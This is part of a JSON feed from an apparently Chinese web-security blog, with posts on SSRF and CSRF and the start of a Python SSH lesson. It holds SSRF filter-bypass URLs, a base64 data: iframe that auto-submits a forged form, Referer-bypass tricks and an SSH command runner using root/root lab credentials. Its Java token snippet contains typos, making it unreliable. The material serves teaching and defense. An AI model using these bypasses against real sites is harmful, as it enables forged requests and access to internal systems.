            "content_html": "<p><span class=\"label success\">✔️嘘，请安静</span></p>\n<div class=\"media-container\"><div class=\"player\" data-type=\"audio\" data-src='[{\"title\":\"列表 1\",\"list\":[\"https://music.163.com/#/song?id=1355292203\"]}]'></div></div>\n<h1 id=\"ssrf的定义与成因\"><a class=\"anchor\" href=\"#ssrf的定义与成因\">#</a> SSRF 的定义与成因</h1>\n<p>SSRF (Server-Side Request Forgery: 服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p>\n<p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定 URL 地址获取网页文本内容，加载指定地址的图片，下载等等。</p>\n<p>注释：除了 http/https 等方式可以造成 ssrf，类似 tcp connect 方式也可以探测内网一些 ip 的端口是否开发服务，只不过危害比较小而已。</p>\n<h1 id=\"可能出现的地方\"><a class=\"anchor\" href=\"#可能出现的地方\">#</a> 可能出现的地方</h1>\n<p>1. 社交分享功能：获取超链接的标题等内容进行显示</p>\n<p>2. 转码服务：通过 URL 地址把原地址的网页内容调优使其适合手机屏幕浏览</p>\n<p>3. 在线翻译：给网址翻译对应网页的内容</p>\n<p>4. 图片加载 / 下载：例如富文本编辑器中的点击下载图片到本地；通过 URL 地址加载或下载图片</p>\n<p>5. 图片 / 文章收藏功能：主要其会取 URL 地址中 title 以及文本的内容作为显示以求一个好的用具体验</p>\n<p>6. 云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行 ssrf 测试</p>\n<p>7. 网站采集，网站抓取的地方：一些网站会针对你输入的 url 进行一些信息采集工作</p>\n<p>8. 数据库内置功能：数据库的比如 mongodb 的 copyDatabase 函数</p>\n<p>9. 邮件系统：比如接收邮件服务器地址</p>\n<p>10. 编码处理，属性信息处理，文件处理：比如 ffpmg，ImageMagick，docx，pdf，xml 处理器等</p>\n<p>11. 未公开的 api 实现以及其他扩展调用 URL 的功能：可以利用 google 语法加上这些关键字去寻找 SSRF 漏洞</p>\n<p>一些的 url 中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……</p>\n<p>12. 从远程服务器请求资源（upload from url 如 discuz！；import &amp; expost rss feed 如 web blog；使用了 xml 引擎对象的地方 如 wordpress xmlrpc.php）</p>\n<h1 id=\"漏洞验证\"><a class=\"anchor\" href=\"#漏洞验证\">#</a> 漏洞验证</h1>\n<p>1. 排除法：浏览器 f12 查看源代码看是否是在本地进行了请求</p>\n<p>比如：该资源地址类型为  <code>http://www.xxx.com/a.php?image=（地址）</code> 的就可能存在 SSRF 漏洞</p>\n<p>2.dnslog 等工具进行测试，看是否被访问</p>\n<p>-- 可以在盲打后台用例中将当前准备请求的 uri 和参数编码成 base64，这样盲打后台解码后就知道是哪台机器哪个 cgi 触发的请求。</p>\n<p>3. 抓包分析发送的请求是不是由服务器的发送的，如果不是客户端发出的请求，则有可能是，接着找存在 HTTP 服务的内网地址</p>\n<p>-- 从漏洞平台中的历史漏洞寻找泄漏的存在 web 应用内网地址</p>\n<p>-- 通过二级域名暴力猜解工具模糊猜测内网地址</p>\n<p>4. 直接返回的 Banner、title、content 等信息</p>\n<p>5. 留意 bool 型 SSRF</p>\n<h1 id=\"利用方式\"><a class=\"anchor\" href=\"#利用方式\">#</a> 利用方式</h1>\n<p>1. 让服务端去访问相应的网址</p>\n<p>2. 让服务端去访问自己所处内网的一些指纹文件来判断是否存在相应的 cms</p>\n<p>3. 可以使用 file、dict、gopher [11]、ftp 协议进行请求访问相应的文件</p>\n<p>4. 攻击内网 web 应用（可以向内部任意主机的任意端口发送精心构造的数据包 {payload}）</p>\n<p>5. 攻击内网应用程序（利用跨协议通信技术）</p>\n<p>6. 判断内网主机是否存活：方法是访问看是否有端口开放</p>\n<p>7.DoS 攻击（请求大文件，始终保持连接 keep-alive always）</p>\n<h1 id=\"绕过限制方法\"><a class=\"anchor\" href=\"#绕过限制方法\">#</a> 绕过限制方法</h1>\n<p>详细绕过参考 -----&gt;<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2VjcHVsc2UuY29tL2FyY2hpdmVzLzY1ODMyLmh0bWw=\">https://www.secpulse.com/archives/65832.html</span></p>\n<p>1. <code>http://xxxx.com@www.baidu.com/</code>  与 <code>http://www.baidu.com/</code>  请求时是相同的</p>\n<p>2. 各种 IP 地址的进制转换</p>\n<p>可以是十六进制，八进制等。<br />\n115.239.210.26  &gt;&gt;&gt;  16373751032<br />\n 首先把这四段数字给分别转成 16 进制，结果：73 ef d2 1a<br />\n 然后把 73efd21a 这十六进制一起转换成 8 进制<br />\n记得访问的时候加 0 表示使用八进制 (可以是一个 0 也可以是多个 0 跟 XSS 中多加几个 0 来绕过过滤一样)，十六进制加 0x</p>\n<p>127.0.0.1 =&gt; 2130706433<br />\n<img data-src=\"image001.png\" alt=\"\" /></p>\n<p>3.URL 跳转绕过： <code>http://www.hackersb.cn/redirect.php?url=http://192.168.0.1/</code></p>\n<p>4. 短网址绕过  <code>http://t.cn/RwbLKDx</code></p>\n<p>短网址原理请参考<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy52ZXJ5aXRtYW4uY29tLzIwMTkvMTEvMjQvJUU3JTlGJUFEJUU1JTlDJUIwJUU1JTlEJTgwJUU1JThFJTlGJUU3JTkwJTg2Lw==\"> http://www.veryitman.com/2019/11/24 / 短地址原理 /</span></p>\n<p>5.xip.io 来绕过： <code>http://xxx.192.168.0.1.xip.io/ == 192.168.0.1 (xxx 任意）</code></p>\n<p>指向任意 ip 的域名：<span class=\"exturl\" data-url=\"aHR0cDovL3hpcC5pbw==\">xip.io</span> (37signals 开发实现的定制 DNS 服务)</p>\n<p>6. 限制了子网段，可以加 :80 端口绕过。 <code>http://tieba.baidu.com/f/commit/share/openShareApi?url=http://10.42.7.78:80</code></p>\n<p>7. 探测内网域名，或者将自己的域名解析到内网 ip</p>\n<p>8. 例如  <code>http://10.153.138.81/ts.php</code>  , 修复时容易出现的获取 host 时以 / 分割来确定 host，</p>\n<p>但这样可以用  <code>http://abc@10.153.138.81/</code>  绕过</p>\n<p>9. 利用 Enclosed alphanumerics</p>\n<pre><code class=\"language-txt\">利用Enclosed alphanumerics\nⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  &gt;&gt;&gt;  example.com\nList:\n① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ \n⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ \n⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ \n⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ \nⒶ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ \nⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ \n⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ \n⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿\n</code></pre>\n<h1 id=\"漏洞示例\"><a class=\"anchor\" href=\"#漏洞示例\">#</a> 漏洞示例</h1>\n<p>1.Wordpress3.5.1 以下版本 xmlrpc.php pingback 的缺陷与 ssrf</p>\n<p>2.discuz！的 ssrf （利用 php 的 header 函数来绕过，其实就是 302 跳转实现协议转换）</p>\n<p>3.weblogic 的 ssrf</p>\n<p>.....</p>\n<h1 id=\"漏洞修复\"><a class=\"anchor\" href=\"#漏洞修复\">#</a> 漏洞修复</h1>\n<p>1. 禁止跳转</p>\n<p>2. 过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果 web 应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p>\n<p>3. 禁用不需要的协议，仅仅允许 http 和 https 请求。可以防止类似于 file://, gopher://, ftp:// 等引起的问题</p>\n<p>4. 设置 URL 白名单或者限制内网 IP（使用 gethostbyname () 判断是否为内网 IP）</p>\n<p>5. 限制请求的端口为 http 常用的端口，比如 80、443、8080、8090</p>\n<p>6. 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p>\n<h1 id=\"reference\"><a class=\"anchor\" href=\"#reference\">#</a> Reference</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMjExNQ==\">https://xz.aliyun.com/t/2115</span><br />\n<span class=\"exturl\" data-url=\"aHR0cDovL2JvYmFvLjM2MC5jbi9sZWFybmluZy9kZXRhaWwvMjQwLmh0bWw=\">http://bobao.360.cn/learning/detail/240.html</span><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2VjcHVsc2UuY29tL2FyY2hpdmVzLzY1ODMyLmh0bWw=\">https://www.secpulse.com/archives/65832.html</span></p>\n",
            "tags": [
                "web安全",
                "SSRF"
            ]
        },
        {
            "id": "https://self-ferry.github.io/2021/02/01/web%E6%BC%8F%E6%B4%9E-CSRF/",
            "url": "https://self-ferry.github.io/2021/02/01/web%E6%BC%8F%E6%B4%9E-CSRF/",
            "title": "web漏洞-CSRF",
            "date_published": "2021-02-01T11:53:47.000Z",
            "content_html": "<p><span class=\"label success\">✔️嘘，请安静</span></p>\n<div class=\"media-container\"><div class=\"player\" data-type=\"audio\" data-src='[{\"title\":\"列表 1\",\"list\":[\"https://music.163.com/#/song?id=1334246005\"]}]'></div></div>\n<h1 id=\"csrf概念\"><a class=\"anchor\" href=\"#csrf概念\">#</a> CSRF 概念</h1>\n<p>CSRF 跨站点请求伪造 (Cross—Site Request Forgery)，跟 XSS 攻击一样，存在巨大的危害性，你可以这样来理解：</p>\n<blockquote>\n<p>攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等。 如下：其中 Web A 为存在 CSRF 漏洞的网站，Web B 为攻击者构建的恶意网站，User C 为 Web A 网站的合法用户。尽管听起来跟 XSS 跨站脚本攻击有点相似，但事实上 CSRF 与 XSS 差别很大，XSS 利用的是站点内的信任用户，而 CSRF 则是通过伪装来自受信任用户的请求来利用受信任的网站。</p>\n</blockquote>\n<h1 id=\"csrf攻击示意图\"><a class=\"anchor\" href=\"#csrf攻击示意图\">#</a> CSRF 攻击示意图</h1>\n<p><img data-src=\"image001.png\" alt=\"\" /></p>\n<p>首先用户 C 浏览并登录了受信任站点 A；<br />\n登录信息验证通过以后，站点 A 会在返回给浏览器的信息中带上已登录的 cookie，cookie 信息会在浏览器端保存一定时间（根据服务端设置而定）；<br />\n完成这一步以后，用户在没有登出（清除站点 A 的 cookie）站点 A 的情况下，访问恶意站点 B；<br />\n这时恶意站点 B 的某个页面向站点 A 发起请求，而这个请求会带上浏览器端所保存的站点 A 的 cookie；<br />\n站点 A 根据请求所带的 cookie，判断此请求为用户 C 所发送的。<br />\n因此，站点 A 会报据用户 C 的权限来处理恶意站点 B 所发起的请求，而这个请求可能以用户 C 的身份发送 邮件、短信、消息，以及进行转账支付等操作，这样恶意站点 B 就达到了伪造用户 C 请求站点 A 的目的。<br />\n受害者只需要做下面两件事情，攻击者就能够完成 CSRF 攻击：</p>\n<ol>\n<li>登录受信任站点 A，并在本地生成 cookie；</li>\n<li>在不登出站点 A（清除站点 A 的 cookie）的情况下，访问恶意站点 B。</li>\n</ol>\n<p>很多情况下所谓的恶意站点，很有可能是一个存在其他漏洞（如 XSS）的受信任且被很多人访问的站点，这样，普通用户可能在不知不觉中便成为了受害者。</p>\n<h1 id=\"csrf漏洞检测\"><a class=\"anchor\" href=\"#csrf漏洞检测\">#</a> CSRF 漏洞检测：</h1>\n<p>检测 CSRF 漏洞是一项比较繁琐的工作，最简单的方法就是抓取一个正常请求的数据包，去掉 Referer 字段后再重新提交，如果该提交还有效，那么基本上可以确定存在 CSRF 漏洞。</p>\n<p>随着对 CSRF 漏洞研究的不断深入，不断涌现出一些专门针对 CSRF 漏洞进行检测的工具，如 CSRFTester，CSRF Request Builder 等。</p>\n<p>以 CSRFTester 工具为例，CSRF 漏洞检测工具的测试原理如下：使用 CSRFTester 进行测试时，首先需要抓取我们在浏览器中访问过的所有链接以及所有的表单等信息，然后通过在 CSRFTester 中修改相应的表单等信息，重新提交，这相当于一次伪造客户端请求。如果修改后的测试请求成功被网站服务器接受，则说明存在 CSRF 漏洞，当然此款工具也可以被用来进行 CSRF 攻击。</p>\n<p>客户端访问服务器时没有同服务器做安全验证</p>\n<p>一切 http 参数可控</p>\n<p>详细 CSRF 检测见<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxOTAxMTIyL2FydGljbGUvZGV0YWlscy8xMDY0MDg3MTQ=\"> https://blog.csdn.net/qq_41901122/article/details/106408714</span></p>\n<h1 id=\"防御csrf攻击\"><a class=\"anchor\" href=\"#防御csrf攻击\">#</a> 防御 CSRF 攻击</h1>\n<h2 id=\"尽量使用post限制get\"><a class=\"anchor\" href=\"#尽量使用post限制get\">#</a> 尽量使用 POST，限制 GET</h2>\n<p>GET 接口太容易被拿来做 CSRF 攻击，看上面示例就知道，只要构造一个 img 标签，而 img 标签又是不能过滤的数据。接口最好限制为 POST 使用，GET 则无效，降低攻击风险。<br />\n当然 POST 并不是万无一失，攻击者只要构造一个 form 就可以，但需要在第三方页面做，这样就增加暴露的可能性。</p>\n<h2 id=\"将cookie设置为httponly\"><a class=\"anchor\" href=\"#将cookie设置为httponly\">#</a> 将 cookie 设置为 HttpOnly</h2>\n<p>CRSF 攻击很大程度上是利用了浏览器的 cookie，为了防止站内的 XSS 漏洞盗取 cookie, 需要在 cookie 中设置 “HttpOnly” 属性，这样通过程序（如 JavaScript 脚本、Applet 等）就无法读取到 cookie 信息，避免了攻击者伪造 cookie 的情况出现。<br />\n在 Java 的 Servlet 的 API 中设置 cookie 为 HttpOnly 的代码如下：<br />\n <code>response.setHeader( &quot;Set-Cookie&quot;, &quot;cookiename=cookievalue;HttpOnly&quot;);</code></p>\n<h2 id=\"增加token\"><a class=\"anchor\" href=\"#增加token\">#</a> 增加 token</h2>\n<p>CSRF 攻击之所以能够成功，是因为攻击者可以伪造用户的请求，该请求中所有的用户验证信息都存在于 cookie 中，因此攻击者可以在不知道用户验证信息的情况下直接利用用户的 cookie 来通过安全验证。由此可知，抵御 CSRF 攻击的关键在于：在请求中放入攻击者所不能伪造的信息，并且该信总不存在于 cookie 之中。鉴于此，系统开发人员可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务端进行 token 校验，如果请求中没有 token 或者 token 内容不正确，则认为是 CSRF 攻击而拒绝该请求。<br />\n假设请求通过 POST 方式提交，则可以在相应的表单中增加一个隐藏域：<br />\n <code>&lt;input type=&quot;hidden&quot; name=&quot;_toicen&quot; value=&quot;tokenvalue&quot;/&gt;</code> <br />\ntoken 的值通过服务端生成，表单提交后 token 的值通过 POST 请求与参数一同带到服务端，每次会话可以使用相同的 token，会话过期，则 token 失效，攻击者因无法获取到 token，也就无法伪造请求。<br />\n在 session 中添加 token 的实现代码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>HttpSession session <span class=\"token operator\">=</span> request<span class=\"token operator\">.</span><span class=\"token function\">getSession</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword type-declaration\">Object</span> token <span class=\"token operator\">=</span> session<span class=\"token operator\">.</span><span class=\"token function\">getAttribute</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"_token\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>token <span class=\"token operator\">==</span> <span class=\"token constant\">null</span> <span class=\"token constant\">I</span> <span class=\"token constant\">I</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token operator\">.</span><span class=\"token function\">equals</span><span class=\"token punctuation\">(</span>token<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    session<span class=\"token operator\">.</span><span class=\"token function\">setAttribute</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"_token\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">UUID</span><span class=\"token operator\">.</span>randomUUIDO <span class=\"token operator\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"通过referer识别\"><a class=\"anchor\" href=\"#通过referer识别\">#</a> 通过 Referer 识别</h2>\n<p>根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。在通常情况下，访问一个安全受限的页面的请求都来自于同一个网站。比如某银行的转账是通过用户访问 <code>http://www.xxx.com/transfer.do</code>  页面完成的，用户必须先登录 <code>www.xxx.com</code> ，然后通过单击页面上的提交按钮来触发转账事件。当用户提交请求时，该转账请求的 Referer 值就会是<br />\n提交按钮所在页面的 URL（本例为 <code>www.xxx. com/transfer.do</code> ）。如果攻击者要对银行网站实施 CSRF 攻击，他只能在其他网站构造请求，当用户通过其他网站发送请求到银行时，该请求的 Referer 的值是其他网站的地址，而不是银行转账页面的地址。因此，要防御 CSRF 攻击，银行网站只需要对于每一个转账请求验证其 Referer 值即可，如果是以 <code>www.xx.om</code>  域名开头的地址，则说明该请求是来自银行网站自己的请求，是合法的；如果 Referer 是其他网站，就有可能是 CSRF 攻击，则拒绝该请求。<br />\n取得 HTTP 请求 Referer：<br />\n <code>String referer = request.getHeader(&quot;Referer&quot;);</code></p>\n<h1 id=\"csrf-绕过referer技巧\"><a class=\"anchor\" href=\"#csrf-绕过referer技巧\">#</a> CSRF-- 绕过 Referer 技巧</h1>\n<p>CSRF 遇到 Referer 绕过的情况，有条件限制，不一定所有的 Refere 验证就可以绕过</p>\n<h2 id=\"referer条件为空条件时\"><a class=\"anchor\" href=\"#referer条件为空条件时\">#</a> referer 条件为空条件时</h2>\n<p>解决方案:</p>\n<p>利用 <code>ftp://, http://, https://, file://, javascript:, data: </code> <br />\n这个时候浏览器地址栏是 <code>file://</code>  开头的，如果这个 HTML 页面向任何 http 站点提交请求的话，这些请求的 Referer 都是空的。</p>\n<p><span class=\"label\">例:</span></p>\n<ol>\n<li>利用 data: 协议</li>\n</ol>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>iframe</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>data:text/html;base64,PGZvcm0gbWV0aG9kPXBvc3QgYWN0aW9uPWh0dHA6Ly9hLmIuY29tL2Q+PGlucHV0IHR5cGU9dGV4dCBuYW1lPSdpZCcgdmFsdWU9JzEyMycvPjwvZm9ybT48c2NyaXB0PmRvY3VtZW50LmZvcm1zWzBdLnN1Ym1pdCgpOzwvc2NyaXB0Pg==<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p>bese64 编码 解码即可看到代码</p>\n<ol start=\"2\">\n<li>利用 https 协议</li>\n</ol>\n<p>https 向 http 跳转的时候 Referer 为空<br />\n拿一个 https 的 webshell<br />\n <code>&lt;iframe src=&quot;https://xxxxx.xxxxx/attack.php&quot;&gt;</code></p>\n<p>attack.php 写上 CSRF 攻击代码</p>\n<h2 id=\"判断referer是某域情况下绕过\"><a class=\"anchor\" href=\"#判断referer是某域情况下绕过\">#</a> 判断 Referer 是某域情况下绕过</h2>\n<p>比如你找的 csrf 是 <code>http://xxx.com</code>  验证的 referer 是验证的 <code>*.http://xx.com</code>  可以找个二级域名 之后 <code>&lt;img &quot;csrf地址&quot;&gt;</code>  之后在把文章地址发出去 就可以伪造。</p>\n<h2 id=\"判断referer是否存在某关键字\"><a class=\"anchor\" href=\"#判断referer是否存在某关键字\">#</a> 判断 referer 是否存在某关键字</h2>\n<p>referer 判断存在不存在 <code>http://google.com</code>  这个关键词</p>\n<p>在网站新建一个 <code>http://google.com</code>  目录 把 CSRF 存放在 <code>http://google.com</code>  目录，即可绕过</p>\n<h2 id=\"判断referer是否含有某域名\"><a class=\"anchor\" href=\"#判断referer是否含有某域名\">#</a> 判断 referer 是否含有某域名</h2>\n<p>判断了 Referer 开头是否以 <code>http://126.com</code>  以及 126 子域名 不验证根域名为 <code>http://126.com</code>  那么我这里可以构造子域名 <code>http://x.126.com.xxx.com</code>  作为蠕虫传播的载体服务器，即可绕过。</p>\n<h1 id=\"reference\"><a class=\"anchor\" href=\"#reference\">#</a> Reference</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC82NzQwOGQ3M2M2NmQ=\">https://www.jianshu.com/p/67408d73c66d</span><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNjA2OTczL2FydGljbGUvZGV0YWlscy84NjUwNDc0Nw==\">https://blog.csdn.net/qq_41606973/article/details/86504747</span><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRjaGF0LmNzZG4ubmV0L2FjdGl2aXR5LzVhMGJhMzQ3ZTFmNzU1NTcxNDgzZWE1YQ==\">https://gitchat.csdn.net/activity/5a0ba347e1f755571483ea5a</span><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vRmx1b3Jlc2NlbmNlLXRqeS9wLzYxMDAzMTAuaHRtbA==\">https://www.cnblogs.com/Fluorescence-tjy/p/6100310.html</span></p>\n",
            "tags": [
                "web安全",
                "CSRF"
            ]
        },
        {
            "id": "https://self-ferry.github.io/2021/01/27/BHP%E7%AC%AC%E4%BA%8C%E7%AB%A0%EF%BC%88%E4%B8%89%EF%BC%89-SSH%E4%B8%8ESSH%E9%9A%A7%E9%81%93/",
            "url": "https://self-ferry.github.io/2021/01/27/BHP%E7%AC%AC%E4%BA%8C%E7%AB%A0%EF%BC%88%E4%B8%89%EF%BC%89-SSH%E4%B8%8ESSH%E9%9A%A7%E9%81%93/",
            "title": "BHP第二章（三）-SSH与SSH隧道",
            "date_published": "2021-01-27T15:43:48.000Z",
            "content_html": "<p><span class=\"label success\">✔️来首音乐吧</span></p>\n<div class=\"media-container\"><div class=\"player\" data-type=\"audio\" data-src='[{\"title\":\"列表 1\",\"list\":[\"https://music.163.com/#/song?id=165405\"]}]'></div></div>\n<h1 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h1>\n<p>通过 python 打造自己的 SSH (Secure Shell)。</p>\n<h1 id=\"通过paramiko使用ssh\"><a class=\"anchor\" href=\"#通过paramiko使用ssh\">#</a> 通过 paramiko 使用 SSH</h1>\n<h2 id=\"例子\"><a class=\"anchor\" href=\"#例子\">#</a> 例子</h2>\n<p>paramiko 是第三方库，要用 pip 安装。 <code>pip install paramiko</code></p>\n<p>在 python 的世界里，可以使用原始套接字和一些加密函数创建自己的 SSH 客户端或者服务端。但 python 中也有现成模块，使用 paramiko 库中的 PyCrypto 能让我们轻松使用 SSH2 协议</p>\n<p>在示例中，我们首先需要引入 <code>paramiko</code>  库，然后使用 <code>SSHClient()</code>  方法实例化对象，然后使用 <code>load_host_key()</code>  方法密钥认证的方式连接服务器，这里让实验可视化使用 <code>connect()</code>  方法以明文密码的方式连接服务器，连接服务器之前可以使用 <code>set_missing_host_key_policy()</code>  设置对于服务器密钥的策略，使用 <code>AutoAddPolicy()</code>  设置策略为自动添加服务器密钥，然后使用 <code>get_transport()</code>  与 <code>open_session()</code>  方法来得到 ssh 加密通道和打开线程，运用 if 语句与 acitve 属性判断线程是否存活，如果存活，使用 <code>exec_command()</code>  来执行我们想要执行的命令，通过 <code>recv()</code>  方法将命令在服务器执行后的结果返回给我们，这里也需要注意编码问题</p>\n<p><span class=\"label\">Code</span></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> paramiko</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">loging_shh</span><span class=\"token punctuation\">(</span>ip<span class=\"token punctuation\">,</span> user<span class=\"token punctuation\">,</span> passwd<span class=\"token punctuation\">,</span> command<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    client <span class=\"token operator\">=</span> paramiko<span class=\"token punctuation\">.</span>SSHClient<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token comment\"># client.load_host_keys('/root/.ssh/konw_hosts')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    client<span class=\"token punctuation\">.</span>set_missing_host_key_policy<span class=\"token punctuation\">(</span>paramiko<span class=\"token punctuation\">.</span>AutoAddPolicy<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    client<span class=\"token punctuation\">.</span>connect<span class=\"token punctuation\">(</span>ip<span class=\"token punctuation\">,</span> username<span class=\"token operator\">=</span>user<span class=\"token punctuation\">,</span> password<span class=\"token operator\">=</span>passwd<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    ssh_session <span class=\"token operator\">=</span> client<span class=\"token punctuation\">.</span>get_transport<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>open_session<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">if</span> ssh_session<span class=\"token punctuation\">.</span>active<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        ssh_session<span class=\"token punctuation\">.</span>exec_command<span class=\"token punctuation\">(</span>command<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>ssh_session<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    loging_shh<span class=\"token punctuation\">(</span><span class=\"token string\">'192.168.199.128'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'root'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'root'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'id'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>运行程序后得到了服务器执行命令后的结果<br />\n<img data-src=\"image001.png\" alt=\"\" 